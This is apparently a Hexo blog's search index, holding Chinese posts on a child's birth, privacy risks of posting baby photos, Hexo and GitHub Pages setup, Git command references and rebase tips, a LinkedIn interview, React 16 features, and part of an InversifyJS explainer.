<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[新生命的诞生]]></title>
    <url>%2Fblog%2F2019%2F02%2F04%2F2019-02-04-%E6%96%B0%E7%94%9F%E5%91%BD%E7%9A%84%E8%AF%9E%E7%94%9F%2F</url>
    <content type="text"><![CDATA[今天是2019年2月4日，农历腊月三十。 昨天早上起床后，洗漱完毕吃完早餐，开始收拾打扫卫生收拾房间，准备迎接新的一年。把阳台晾晒干的床单被罩收下来叠好，把衣柜里面的所有衣物都搬出来，放在床上全部重新整理叠放整齐，准备大干一场，老婆挺着大肚子，但还是闲不下，非要帮忙收拾家里卫生，听见厨房里面叮叮咚咚的声音，我走出来才发现，老婆带着口罩，穿着防水手套，已经把油烟机拆下来在冲洗了。。。整个厨房里面散发着刺鼻的油污清洗剂的味道，又气又心疼的赶紧把她叫出来，让她坐在沙发上别再动了，然后我就继续去整理衣物。她刚坐下来没有五分钟，手里拿着牙刷，仓皇的走进房间给我说，准备去医院。。。于是赶紧放下手上的活，换好衣服准备出发。 在路上还没有太强烈的反应，到了医院之后就慢慢的感受到肚子间隔的疼，刚开始去急想诊办理住院，无果，告知在哪儿做的产检在哪儿生。给在医院上班的妹妹打电话求援，告知赶紧去门诊，于是扶着老婆，艰难的辗转到门诊，不得不说门诊的态度真好，看我慌慌整张的，护士帮我去办了卡，于是就在门诊开了住院。从三四点住进医院之后，老婆每个几分钟就疼得厉害，我就一直帮她做背部按摩，以缓解疼痛。为了不影响其它病床的病人，她疼得不敢叫，让我陪她在走廊里面走走。 直到晚上九点，老婆进了产房，我就在门口焦虑的等着，也不知道里面现在什么情况了，后来回信息说打了无痛了，感觉好点了，但是可能今晚生不了，让我先回病房睡觉，可是哪里能睡得着，一整晚都特别清醒，半夜的时候儿童团里面还聊的很嗨，大家都在期待小家伙的诞生。到了早上六点多，实在困得不行了就睡着了，七点多的时候老婆发信息说顺不下来，医生可能要给剖了。我知道老婆爱美，不想在肚子上挨一刀，毕竟从头到尾都认为自己能顺，我也很心疼她，怕她害怕怕她疼。可是时间不能再等了，医生再三的催我签字，说再等的话小孩就危险了，我的心情非常矛盾，可是我还是尊重她的意见，直到她最后给我发信息说听医生的，我才签了字，进去签字的时候，正好碰上医生交接班，听见主治医生给交班医生说，34床病人家属二货，都那个样子了还要等，都不知道他们家人怎么想的，我默默地没有说话，把字签了，他回头看了我一眼说，终于知道签了。。。 九点十分，丈母娘和小舅子帮忙把老婆退进手术室，我们依旧是在门口等，九点五十手术室门开了，先推出来的是小汤圆，老婆还得在里面继续观察一段时间。医生拿着单子，让我去办理小孩的住院，接下来我又是一顿乱窜，一会东边缴费一会西边领卡，等到我搬完所有手续之后，小舅子打电话说人已经出来了，让我赶紧上来，医生要给交代注意事项。于是赶紧回到病房，这时老婆意识还算清醒，医生嘱咐完所有的注意事项后，我就让丈母娘和小舅子都回去了，医院规定只能留一个陪护人。这个时候我也来不及问小汤圆的情况，看着老婆躺在那里，吸着氧气，手挽手插满了各种针管，床头的仪器发出滴滴滴的声音，心里面很不是滋味。 等到一瓶液体输完之后，换第二瓶的时候，老婆说她感觉自己在颤抖，问我看是不是，我凑近仔细观察，没发现颤抖，到是看见她额头上有一块一块的共色印记，拉开被子一看，差点把我吓蒙了，整个胸膛全都是一块一块红色的印记，于是我赶紧跑出去叫医生过来看，医生跑进来，赶紧把液体停了，但是血压还是持续在110/150，她平时血压本来也不高，都在70/110，医生就问平时血压也这么高吗？我说没有。过了一会第一瓶液体已经输完，换上了第二瓶，刚换上没过多久，就听见我老婆用尽最后一点力气喊道，医生，我快呼吸不过来了，听见这句话的时候我都快哭了，我不知道接下来会怎样，所有的希望都寄托在医生那里，医生再次把药停了，医生也很紧张，因为她也从来没有遇见过这种情况，皮试已经做过了，没有问题，无奈之下把所有的消炎药都停了，换上了盐水，之后就没有出现过类似情况了。 经过刚才的事情之后，我更加不敢有丝毫的松懈，时刻注意观察老婆的情况，到了晚上八点多的时候，最后一瓶液体输完了，这个时候我才松了一口气，期间小汤圆是下午六点多送到病房的，只见他一直在睡觉，也不吃也不哭，我庆幸的跟老婆说，我们的宝宝好乖呀，都几个小时了，也不哭不闹。可是高兴的有点太早了，到了晚上九点以后，小汤圆就可是哭闹，面对这么小的一个新生命，我有点束手无策，不知道他为什么哭，老婆说她可能饿了，于是我就第一次给他冲奶粉，按照老婆说的比例和温度，冲好了奶粉开始喂小汤圆吃奶。喂了半天，只见小嘴巴在动，可是奶根本就没有少。当时不知道为什么，以为就只能吃那么多，可是过一会又开始哭，我以为拉粑粑了，然后给换尿布，发现根本就跟没有拉一样。可是换完了之后还是各种哭闹，哭的最撕心裂肺的是半夜三四点的时候，隔壁陪护阿姨说你娃是不是哪儿不舒服，于是我就抱去给医生看，医生说是不是没有吃饱，我说我喂过了呀，可是他都不怎么吃。后来才知道，是我没有把奶嘴放进去，小孩根本就没有吃到。。。 到了天亮的时候，丈母娘做了饭送过来了，准备让我吃完去妹妹家睡一觉，可是这个时候我反而一点都不困了，吃完饭之后，给丈母娘交代完注意事项之后，我稍稍的松了一口气，出了医院大门，点了一根烟，打了出租车，一路上都在跟司机大哥闲篇，心里面美滋滋的]]></content>
      <categories>
        <category>生活</category>
        <category>小汤圆</category>
      </categories>
      <tags>
        <tag>出生了</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不要在网上晒娃]]></title>
    <url>%2Fblog%2F2018%2F12%2F14%2F2018-12-14-%E4%B8%8D%E8%A6%81%E5%9C%A8%E7%BD%91%E4%B8%8A%E6%99%92%E5%A8%83%2F</url>
    <content type="text"><![CDATA[照片的meta data有时间、地理位置。出生时的照片：推算出生日期与地点；第一天上学的照片：是时候投放文具、课外兴趣班的广告了；在家里、小区里的照片：知道你家在哪了，可以进行绑票、恐吓活动了。 很多网站都有“安全问题”：你的生日？你的出生地？你妈贵姓？你最喜欢的运动？你的童年梦想？这些答案或许能从你的社交账号里挖掘出来。]]></content>
  </entry>
  <entry>
    <title><![CDATA[hexo搜索一直loding解决方案]]></title>
    <url>%2Fblog%2F2018%2F12%2F13%2F2018-12-13-hexo%E6%90%9C%E7%B4%A2%E4%B8%80%E7%9B%B4loding%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[查看在本地调试服务器(http://localhost:4000/blog/search.xml)查看search.xml是否能够正常访问]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2Fblog%2F2018%2F12%2F11%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[hexo个性化]]></title>
    <url>%2Fblog%2F2018%2F12%2F03%2Fhexo%E4%B8%AA%E6%80%A7%E5%8C%96%2F</url>
    <content type="text"><![CDATA[给自己的博客换上漂亮的主题，本次采用NexT主题。 1.进入到自己的hexo项目中，输入：git clone https://github.com/theme-next/hexo-theme-next themes/next 2.进入到hexo配置文件_config.yml，修改_theme 3.执行命令：hexo s启动项目，查看界面样式已经变味清新的Next风格]]></content>
  </entry>
  <entry>
    <title><![CDATA[使用Hexo+Github搭建属于自己的博客]]></title>
    <url>%2Fblog%2F2018%2F12%2F03%2F%E4%BD%BF%E7%94%A8Hexo%2BGithub%E6%90%AD%E5%BB%BA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[1、安装Node.js和配置好Node.js环境，打开cmd命令行，成功界面如下 2、安装Git和配置好Git环境，安装成功的象征就是在电脑上任何位置鼠标右键能够出现如下两个选择 3、Github账户注册和新建项目，项目必须要遵守格式：账户名.github.io，不然接下来会有很多麻烦。并且需要勾选Initialize this repository with a README 注意：必须选择一个主题才能访问github page 在建好的项目右侧有个settings按钮，点击它，向下拉到GitHub Pages，你会看到那边有个网址，访问它，你将会惊奇的发现该项目已经被部署到网络上，能够通过外网来访问它。 4、安装Hexo，在自己认为合适的地方创个文件夹，如hello-hexo，然后通过命令行进入到该文件夹里面 输入npm install hexo -g，开始安装Hexo 进入到hello-hexo文件夹，点击右键，选择Git bash here，输入hexo -v，检查hexo是否安装成功 输入hexo init，初始化该文件夹（有点漫长的等待。。。） 输入npm install，安装所需要的组件 输入hexo g，首次体验Hexo 输入hexo s，开启服务器，访问该网址，正式体验Hexo 问题：假如页面一直无法跳转，那么可能端口被占用了。此时我们ctrl+c停止服务器，接着输入“hexo server -p 端口号”来改变端口号 5、将Hexo与Github page联系起来，设置Git的user name和email进入到C盘–&gt;当前用户–&gt;.ssh，用记事本打开id_rsa.pub 登录Github，点击头像下的settings，添加ssh 新建一个new ssh key，将id_rsa.pub文件里的内容复制上去 6、配置Deployment，在其文件夹中，找到_config.yml文件，修改repo值（在末尾） 7、新建一篇博客，在cmd执行命令：hexo new post “博客名” 这时候在文件夹_posts目录下将会看到已经创建的文件 在生成以及部署文章之前，需要安装一个扩展：npm install hexo-deployer-git –save 使用编辑器编好文章，那么就可以使用命令：hexo g，生成编译后的文件 便以文件生成后，使用命令：hexo d，那么将看到生成的文章 部署成功后访问你的地址：http://用户名.github.io。那么将看到生成的文章]]></content>
  </entry>
  <entry>
    <title><![CDATA[Git常用命令]]></title>
    <url>%2Fblog%2F2018%2F12%2F03%2FGit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库一、新建代码库一、新建代码库 # 在当前目录新建一个Git代码库 $ git init # 新建一个目录，将其初始化为Git代码库 $ git init [project-name] # 下载一个项目和它的整个代码历史 $ git clone [url] 二、配置 Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 # 显示当前的Git配置 $ git config --list # 编辑Git配置文件 $ git config -e [--global] # 设置提交代码时的用户信息 $ git config [--global] user.name &quot;[name]&quot; $ git config [--global] user.email &quot;[email address]&quot; 三、增加/删除文件 # 添加指定文件到暂存区 $ git add [file1] [file2] ... # 添加指定目录到暂存区，包括子目录 $ git add [dir] # 添加当前目录的所有文件到暂存区 $ git add . # 添加每个变化前，都会要求确认 # 对于同一个文件的多处变化，可以实现分次提交 $ git add -p # 删除工作区文件，并且将这次删除放入暂存区 $ git rm [file1] [file2] ... # 停止追踪指定文件，但该文件会保留在工作区 $ git rm --cached [file] # 改名文件，并且将这个改名放入暂存区 $ git mv [file-original] [file-renamed] 四、代码提交 # 提交暂存区到仓库区 $ git commit -m [message] # 提交暂存区的指定文件到仓库区 $ git commit [file1] [file2] ... -m [message] # 提交工作区自上次commit之后的变化，直接到仓库区 $ git commit -a # 提交时显示所有diff信息 $ git commit -v # 使用一次新的commit，替代上一次提交 # 如果代码没有任何新变化，则用来改写上一次commit的提交信息 $ git commit --amend -m [message] # 重做上一次commit，并包括指定文件的新变化 $ git commit --amend [file1] [file2] ... 五、分支 # 列出所有本地分支 $ git branch # 列出所有远程分支 $ git branch -r # 列出所有本地分支和远程分支 $ git branch -a # 新建一个分支，但依然停留在当前分支 $ git branch [branch-name] # 新建一个分支，并切换到该分支 $ git checkout -b [branch] # 新建一个分支，指向指定commit $ git branch [branch] [commit] # 新建一个分支，与指定的远程分支建立追踪关系 $ git branch --track [branch] [remote-branch] # 切换到指定分支，并更新工作区 $ git checkout [branch-name] # 切换到上一个分支 $ git checkout - # 建立追踪关系，在现有分支与指定的远程分支之间 $ git branch --set-upstream [branch] [remote-branch] # 合并指定分支到当前分支 $ git merge [branch] # 选择一个commit，合并进当前分支 $ git cherry-pick [commit] # 删除分支 $ git branch -d [branch-name] # 删除远程分支 $ git push origin --delete [branch-name] $ git branch -dr [remote/branch] 六、标签 # 列出所有tag $ git tag # 新建一个tag在当前commit $ git tag [tag] # 新建一个tag在指定commit $ git tag [tag] [commit] # 删除本地tag $ git tag -d [tag] # 删除远程tag $ git push origin :refs/tags/[tagName] # 查看tag信息 $ git show [tag] # 提交指定tag $ git push [remote] [tag] # 提交所有tag $ git push [remote] --tags # 新建一个分支，指向某个tag $ git checkout -b [branch] [tag] 七、查看信息 # 显示有变更的文件 $ git status # 显示当前分支的版本历史 $ git log # 显示commit历史，以及每次commit发生变更的文件 $ git log --stat # 搜索提交历史，根据关键词 $ git log -S [keyword] # 显示某个commit之后的所有变动，每个commit占据一行 $ git log [tag] HEAD --pretty=format:%s # 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件 $ git log [tag] HEAD --grep feature # 显示某个文件的版本历史，包括文件改名 $ git log --follow [file] $ git whatchanged [file] # 显示指定文件相关的每一次diff $ git log -p [file] # 显示过去5次提交 $ git log -5 --pretty --oneline # 显示所有提交过的用户，按提交次数排序 $ git shortlog -sn # 显示指定文件是什么人在什么时间修改过 $ git blame [file] # 显示暂存区和工作区的代码差异 $ git diff # 显示暂存区和上一个commit的差异 $ git diff --cached [file] # 显示工作区与当前分支最新commit之间的差异 $ git diff HEAD # 显示两次提交之间的差异 $ git diff [first-branch]...[second-branch] # 显示今天你写了多少行代码 $ git diff --shortstat &quot;@{0 day ago}&quot; # 显示某次提交的元数据和内容变化 $ git show [commit] # 显示某次提交发生变化的文件 $ git show --name-only [commit] # 显示某次提交时，某个文件的内容 $ git show [commit]:[filename] # 显示当前分支的最近几次提交 $ git reflog # 从本地master拉取代码更新当前分支：branch 一般为master $ git rebase [branch] 八、远程同步 $ git remote update --更新远程仓储 # 下载远程仓库的所有变动 $ git fetch [remote] # 显示所有远程仓库 $ git remote -v # 显示某个远程仓库的信息 $ git remote show [remote] # 增加一个新的远程仓库，并命名 $ git remote add [shortname] [url] # 取回远程仓库的变化，并与本地分支合并 $ git pull [remote] [branch] # 上传本地指定分支到远程仓库 $ git push [remote] [branch] # 强行推送当前分支到远程仓库，即使有冲突 $ git push [remote] --force # 推送所有分支到远程仓库 $ git push [remote] --all 九、撤销 # 恢复暂存区的指定文件到工作区 $ git checkout [file] # 恢复某个commit的指定文件到暂存区和工作区 $ git checkout [commit] [file] # 恢复暂存区的所有文件到工作区 $ git checkout . # 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 $ git reset [file] # 重置暂存区与工作区，与上一次commit保持一致 $ git reset --hard # 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 $ git reset [commit] # 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 $ git reset --hard [commit] # 重置当前HEAD为指定commit，但保持暂存区和工作区不变 $ git reset --keep [commit] # 新建一个commit，用来撤销指定commit # 后者的所有变化都将被前者抵消，并且应用到当前分支 $ git revert [commit] # 暂时将未提交的变化移除，稍后再移入 $ git stash $ git stash pop]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linkedin 采访]]></title>
    <url>%2Fblog%2F2018%2F11%2F27%2F2018-11-27-linkedin-%E9%87%87%E8%AE%BF%2F</url>
    <content type="text"><![CDATA[Linkedin 每年都会搞一个「最强档案」的榜单，今年也不例外；很荣幸的是，我上榜了，发榜之前官方的同学邮件对我做了一次采访，下面我把问题和回复发出来，以供参考。 一、人生/职业照片 您可以选择任何有代表性的人生/职业阶段的照片提供（并附以简单的说明），张数不限。 第一家实习的公司——百度。奎科大厦的伙食实在太差，加上北京（生活和购房）压力大，有离开北京的想法。 第一次被邀请出去讲我在阿里的成长。 2017~2018，结婚了，有房了，有车了，有娃了，为美好生活而继续努力。 中间省略了 4-5 张。 二、职业故事 您可以以一段文字简单介绍您的职业故事，包括但不限于创业故事，职业选择，职业转折等任何您想分享给访客的个人故事，字数不限。 我在大二的时候就已经初步明确了自己的职业发展方向——前端。毕业四年时间，我从一个懵懂的新人成长为领域专家，再回首要感谢很多很多的人。在这里给自己的成长做一个小结： 保持好奇和对知识的饥渴 培养理性思维习惯，辩证看待所有的一切 学会让别人看见自己，也学会从别人那里看见自己 不断地升级自己的圈子，跟比你「强」的人交流 认真做人，踏实做事，保持冷静和风趣 生活从来都是公平的，这个世上没有蠢材，只有不勤奋的人。 三、问答环节 ① 至今为止，您认为职业生涯中对您来说最重要的一段经历/一件事是什么？为什么？对您产生了怎样的影响？ 作为一个技术新人时，我负责一块比较重要且特殊的业务。它的受众很多，每天都有上亿人使用；系统的复杂度不是很高，但风险很大，需要跟很多人交涉。我接手之时业务发生了一些变化，作业量很大，来自业务方的压力和技术上的挑战也很大。那段时间连续一两个月加班到晚上 1 点左右，回家以后还有可能收到业务方的电话。 有一天晚上 11 点钟，整层楼只剩下我和主管在优化一个技术细节问题。那天晚上我突然疲惫到泣不成声，主管在旁边。等我哭的差不多的时候，他告诉我：“成长是很累，但是人可以累，心不能累”。 这几年我一直记着这段往事，也把那句话刻在了心里。从那以后不管是工作还是生活，我都尽量保持良好的心态，每每感觉心累的时候都会想办法调节自己。 一年半以后，我觉得自己在那块业务上已经做到了极致，主动换到了另一块业务。那时回首，感觉像是在告别曾经的自己。 ② 您认为成功的定义是什么？职业上“成功“的定义又应该是什么？ 站在公司的角度，我认为成功的定义就是真正服务好客户，做到公司、员工和客户三者共赢。 站在个人的角度，每个阶段对成功的理解都在变化。起初，我认为成功就是成为一个厉害的人，让身边的人都高看自己一眼；后来，我觉得成功是在预计的时间内按计划完成了自己想要做的事情；现在，我觉得成功是能够照顾好家庭，支持好业务，服务好团队。而未来，可能还在变化。 ③ 如果您只能给年轻的职场人一个建议，您会给的建议是？ 做一个有底蕴的人。开拓自己的眼界，提升自己的技能，夯实自己的基础。 未来我们会遇到各种各样棘手的问题，有来自家庭的，但更多的是来自工作中的。如果自己的认知一直处于低水平，甚至没有意识到自己的认知处于低水平，你会发现自己处理问题的方法、效率和结果都不尽人意。不断提升自己思考的维度，不断给自己设定「下一个目标」，勇往直前！ ④ 您如何看待工作与生活之间的关系，如何做到工作与生活的平衡？ 这几年我一直以工作为中心，基本没有去平衡生活。生活更像是工作的延伸，其实这样也没什么不好。 生活在不同时段赋予每个人的职能和职责是不一样的。昨天我是一个学生，今天我是一个爸爸，明天我是一个企业的管理者。做好每个角色应该做的事情才能去平衡，如果做不好，就谈不上平衡。 ⑤ 您对您所从事工作的热情/动力来源是什么？换言之，您认为您工作是为了什么？ 个人对于知识的渴望度比较高。在不断的学习和沟通过程中能够去发现一些新的艺术，满足自己的求知欲；不断完成一些小目标，满足自己的成就感。 工作的激情常常就是激情而已。不到两年激情没了，也就缺少干劲了。不断给自己设定新的挑战吧，这样才能持续下去。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>采访</tag>
        <tag>Linkedin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git 常用技巧]]></title>
    <url>%2Fblog%2F2018%2F11%2F26%2F2018-11-26-git-%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[git 的版本管理思路，十分简单：使用一个类似链表的结构，将每次修改记录串联起来。每次提交都会产生一个 SHA1 的唯一标示符，我们可以利用 git 提供的命令行工具对“链表”中的每次修改进行编辑、删除、插入、移动等等多种操作。下面就介绍几种十分有用也比较常用的操作方法，为了方便理解，表述上可能不够准确。 下面是一个提交了 4 次的分支效果，每个节点的意思是 节点名(commit 信息 - SHA1)： 1A(add A - 510fdc) -&gt; B(add B - 0406b6) -&gt; C(add C - 39a9c2) -&gt; D(add D - 3131e0)&lt;当前&gt; 修改最近一次的提交信息将上次提交的信息（add D），修改为 push D，可以通过 commit 的 amend 指令进行修改，如下： 12git commit --amend# 执行命令后，会进入到一个交互窗口，可以在交互窗口内修改上次的提交信息 利用 rebase 对提交进行各种修改rebase 的常用操作分为这么几步： 选择操作的起点位置，git rebase -i SHA1 指定每个节点的操作方式，保留/删除/修改/...，进入操作 进入下一步操作/终止操作，git rebase --continue，git rebase --abort 比如我们要将节点 B 的 commit 信息（add B），修改为 push B，那么按照上述的操作指南，可以执行（第一步）： 12# 第一步，进入 B 之前的节点，Agit rebase -i 510fdc # 510fdc 是 A 节点的 SHA1 此时会进入一个交互窗口，内容大致为： 123pick B 0406b6pick C 39a9c2pick D 3131e0 你需要看懂这个结构，不过也不用紧张，它很简单。由于我们将操作指针指向了 A，所以它会展示 A 以后的所有提交记录，根据链表顺序排列，依次展示节点 B、C、D，前面的一个英文单词是操作指令，总共有这么几种指令： pick，保留节点，不做任何变更 edit，保留节点，修改内容 drop，删除节点，删除本次提交 reword，保留节点，修改提交信息 squash，保留节点修改，并且与上一个节点合并，也就是两次提交并做一次 fixup，保留节点修改，忽略本次提交信息 exec，run command (the rest of the line) using shell 用的比较多的是前三个，可以只关注前三个。我们需要修改下交互窗口的内容，改为（第二步）： 1234+ edit B 0406b6- pick B 0406b6pick C 39a9c2pick D 3131e0 上面是 diff，实际内容是： 123edit B 0406b6pick C 39a9c2pick D 3131e0 此时会进入一个临时 git 分支，大致是这样： 1branch(0406b6): 由于你告诉了 git 要对 B 节点就行修改，所以它就停在了 B 处理，等着你修改，此时，你可以通过 amend 命令修改提交信息： 12branch(0406b6): git commit --amend# 进入交互窗口，将 commit 信息修改为 push B 操作完成后，执行（第三步）： 1git rebase --continue 由于你告诉 git 只需要操作一个节点，所以它会回到最初的位置&lt;当前&gt;，否则的话，它会继续进入下一个临时 git 分支。当然，如果你进入第三步以后，突然又不想修改了，可以执行： 1git rebase --skip 跳过对本节点的修改。 以上就是 rebase 的基本使用方法，那么留下几个思考题，读者可以自行操作： 通过 rebase 删除 C 节点（drop） 通过 rebase 合并 A 和 B 节点的修改（squash） 交换 B 和 C 的提交顺序 将一个分支的修改合并到另一个分支通过 git cherry-pick SHA1 这个指令可以可以完成目标， 123master: A(add A - 510fdc) -&gt; B(add B - 0406b6) -&gt; C(add C - 39a9c2)&lt;当前&gt; \dev: D(add D - 4569c2) -&gt; E(add E - 087342) 如果我们想把 dev 分支 D 节点的修改合并到 master 分支，可以执行： 12# 首先确保自己在 master 分支上，git branch mastergit cherry-pick 4569c2 # 4569c2 为 D 节点的 SHA1 快速定位一个 bug 在哪次修改上假设我们在本地提交了一堆 commit，正准备 push 到仓库之前，发现有一个 bug，但是记不起来是哪一次 commit 造成的了，怎么办？我们需要通过 reset/rebase/stash 等操作回滚到上一个状态进行测试，但是这样会很麻烦，而且效率不一定很高，git 为我们提供了更加便捷的工具 git bisect，通过二分法找 bug。它提供的命令也很直白： 1234git bisect start # 进入二分查找git bisect good [good-commit-id] # 设置没问题的版本 SHA1，排查起点git bisect bad [bad-commit-id] # 设置有问题的版本 SHA1，排查终点# 此时 git 就会自动进入到中间版本状态 进入中间版本状态，测试后，如果有问题，就标记为 bad，如果没有问题，就标记为 good，如下： 12git bisect bad # 有问题git bisect good # 没问题 当你找到问题以后，可以执行 reset 回到初始状态： 1git bisect reset 然后通过上面介绍的 rebase edit 操作对错误分支进行修改。 （未完待续）]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React16.x特性剪辑]]></title>
    <url>%2Fblog%2F2018%2F11%2F22%2FReact16-x%E7%89%B9%E6%80%A7%E5%89%AA%E8%BE%91%2F</url>
    <content type="text"><![CDATA[本文整理了 React 16.x 出现的耳目一新的概念与 api 以及应用场景。 更多 React 系列文章可以订阅blog 16.0 Fiberhe在 16 之前的版本的渲染过程可以想象成一次性潜水 30 米，在这期间做不了其它事情(Stack Reconciler); 痛点概括: 一次性渲染到底 中途遇到优先级更高的事件无法调整相应的顺序 在 16 版本上, React 带来了 Fiber 的架构, 接着拿上面的潜水例子为例，现在变为可以每次潜 10 米，分 3 个 chunk 进行; chunk 和 chunk 之间通过链表连接; chunk 间插入优先级更高的任务, 先前的任务被抛弃。 开启 Fiber 后，获取异步数据的方法应放到 render 后面的生命周期钩子里(phase 2 阶段)进行, 因为 render 前面的生命周期钩子(phase 1阶段)会被执行多次 注意: 并没有缩短原先组件的渲染时间(甚至还加长了)，但用户却能感觉操作变流畅了。 render()在 React16 版本中 render() 增加了一些返回类型，到目前为止支持的返回类型如下： React elements. Arrays and fragments. Portals. String and numbers. Booleans or null. [render](https://reactjs.org/docs/react-component.html#render] 其中 render() 支持返回 Arrays 能让我们少写一个父节点, 如下所示: 1234const renderArray = () =&gt; [ &lt;div&gt;A&lt;/div&gt; &lt;div&gt;B&lt;/div&gt;] 个人认为 render() 支持返回数组完全可以取代 Fragments Portals(传送门)将 react 子节点渲染到指定的节点上 案例：实现一个 Modal 组件，demo 另外关于 Portals 做到冒泡到父节点的兄弟节点这个现象, demo, 我想可以这样子实现：如果组件返回是 Portal 对象，则将该组件的父组件的上的事件 copy 到该组件上。其实并不是真的冒泡到了父节点的兄弟节点上。 Error BoundariesReact 16 提供了一个新的错误捕获钩子 componentDidCatch(error, errorInfo), 它能将子组件生命周期里所抛出的错误捕获, 防止页面全局崩溃。demo componentDidCatch 并不会捕获以下几种错误 事件机制抛出的错误(事件里的错误并不会影响渲染) Error Boundaries 自身抛出的错误 异步产生的错误 服务端渲染 服务端渲染服务端渲染一般是作为最后的优化手段, 这里浅显(缺乏经验)谈下 React 16 在其上的优化。 在 React 16 版本中引入了 React.hydrate(), 它的作用主要是将相关的事件注水进 html 页面中, 同时会比较前端生成的 html 和服务端传到前端的 html 的文本内容的差异, 如果两者不一致将前端产生的文本内容替换服务端生成的(忽略属性)。 支持自定义属性在 React 16 版本中, 支持自定义属性(推荐 data-xxx), 因而 React 可以少维护一份 attribute 白名单, 这也是 React 16 体积减少的一个重要因素。 life cycle在 React 16.3 的版本中，新加入了两个生命周期： getDerivedStateFromProps(nextProps, prevState): 更加语义化, 用来替代 componentWillMount、componentWillReceiveProps(nextProps); getSnapshotBeforeUpdate(prevProps, prevState): 可以将结果传入 componentDidUpdate 里, 从而达到 dom 数据统一。用来替代 componentWillUpdate()（缺点是 React 开启异步渲染后，componentWillUpdate() 与 componentDidUpdate() 间获取的 dom 会不统一; 16.7 Hooks在 React 16.7 之前，React 有两种形式的组件，有状态组件(类)和无状态组件(函数)。Hooks 的意义就是赋能先前的无状态组件，让之变为有状态。这样一来更加契合了 React 所推崇的函数式编程。 接下来梳理 Hooks 中最核心的 2 个 api, useState 和 useEffect useStateuseState 返回状态和一个更新状态的函数 1const [count, setCount] = useState(initialState) 使用 Hooks 相比之前用 class 的写法最直观的感受是更为简洁 123456789101112function App() &#123; const [count, setCount] = useState(0) return ( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125; useEffect(fn)在每次 render 后都会执行这个钩子。可以将它当成是 componentDidMount、componentDidUpdate、componentWillUnmount 的合集。因此使用 useEffect 比之前优越的地方在于： 可以避免在 componentDidMount、componentDidUpdate 书写重复的代码; 可以将关联逻辑写进一个 useEffect;(在以前得写进不同生命周期里); 在上述提到的生命周期钩子之外，其它的钩子是否在 hooks 也有对应的方案或者舍弃了其它生命周期钩子, 后续进行观望。]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解读 IoC 框架 InversifyJS]]></title>
    <url>%2Fblog%2F2018%2F11%2F07%2F%E8%A7%A3%E8%AF%BBIoC%E6%A1%86%E6%9E%B6InversifyJS%2F</url>
    <content type="text"><![CDATA[InversityJS 是一个 IoC 框架。IoC(Inversion of Control) 包括依赖注入(Dependency Injection) 和依赖查询(Dependency Lookup)。 相比于类继承的方式，控制反转解耦了父类和子类的联系。 案例解析1234567891011121314151617181920212223242526272829303132333435363738394041import 'reflect-metadata'import &#123; inject, injectable, Container &#125; from 'inversify'const container = new Container()@injectable()class PopMusic &#123; getName() &#123; return '流行音乐' &#125;&#125;container.bind('request1').to(PopMusic)@injectable()class ClassicalMusic &#123; getName() &#123; return '古典音乐' &#125;&#125;container.bind('request2').to(ClassicalMusic)@injectable()class Music &#123; pm: any cm: any constructor( @inject('request1') popMusic: any, @inject('request2') classicalMusic: any) &#123; this.pm = popMusic this.cm = classicalMusic &#125; getName() &#123; const result = this.pm.getName() + this.cm.getName() return result &#125;&#125;container.bind('Plan').to(Music)const music: any = container.get('Plan')console.log(music.getName()) // 流行音乐古典音乐 上述案例可以抽象为下图： 虚线表示可以注入，但在代码中没有表现出来。 代码流程可概括如下： 1.将所有相关类(这里指 Music、popMusic、classicMusic) 通过 @injectable 声明进 container 容器; 2.通过 container.get() 获取 container.bind().to(target) 中的目标对象(这里指 Music); 3.如果目标对象中的 constructor() 里有 @inject(), 则将相应的实例(这里指 PopMusic 与 classicalMusic 的实例)当作构造函数的参数’注入’; inject/injectable 相关源码inject 源码简化如下： 1234567// 这是一个属性装饰器function inject(serviceIdentifier) &#123; return function (target, targetKey) &#123; const metadataValue = &#123; [targetKey]: [Metadata &#123; key: 'inject', value: serviceIdentifier &#125;)] &#125; Reflect.defineMetadata('inversify:tagged_props', metadataValue, target.constructor); &#125;&#125; injectable 源码简化如下： 12345678// 这是一个类装饰器function injectable() &#123; return function (target) &#123; const metadataValue = [] Reflect.defineMetadata('inversify:paramtypes', metadataValue, target) return target &#125;&#125; 从简化版源码中可以看到 inject/injectable 最终是对 Reflect.defineMetadata() 的一个使用。可以将 metadata 看成是一种相对高效的数据结构。 reflect-metadataInversityJS 深度结合了 reflect-metadata, reflect-metadata 在 Reflect 基础上对其 api 